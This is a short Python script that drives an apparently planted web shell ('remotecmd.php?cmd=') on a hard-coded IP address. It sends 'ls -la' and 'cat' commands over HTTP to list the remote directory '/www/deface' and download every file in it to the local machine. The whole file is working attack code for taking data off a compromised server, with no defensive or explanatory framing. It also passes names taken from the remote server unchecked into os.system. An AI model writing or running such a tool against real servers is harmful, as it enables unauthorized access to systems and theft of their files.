import os
import requests


URL = 'http://222.112.11.222:64825/shop/remotecmd.php?cmd={}'

def RunCommand(cmd) :
	r = requests.get(URL.format(cmd.replace(' ', '%20')))
	return r.content

def GetFileList(path) :
	# @return  (is_directory, filename)
	data = RunCommand('ls -la {}'.format(path))
	raw_list = data.strip().split(b'\n')[1:]
	filelist = []

	for f in raw_list :
		t = f.split()
		filelist.append((t[0][0] == 100, t[-1].decode()))

	return filelist

def Crawl(path, recursive=False) :
	filelist = GetFileList(path)
	print('Crawling {} ...'.format(path))

	for isdir, fname in filelist :
		if fname == '.' or fname == '..' :
			continue

		print('  Getting {} ...'.format(fname))

		if isdir :
			os.system('mkdir {}'.format(fname))

			if recursive :
				os.chdir(fname)
				Crawl('{}/{}'.format(path, fname), recursive)
				os.chdir('..')

			continue

		if os.path.isfile(fname) :
			continue

		data = RunCommand('cat {}/{}'.format(path, fname))

		with open(fname, 'wb') as f :
			f.write(data)


if __name__ == '__main__' :
	Crawl('/www/deface', recursive=False)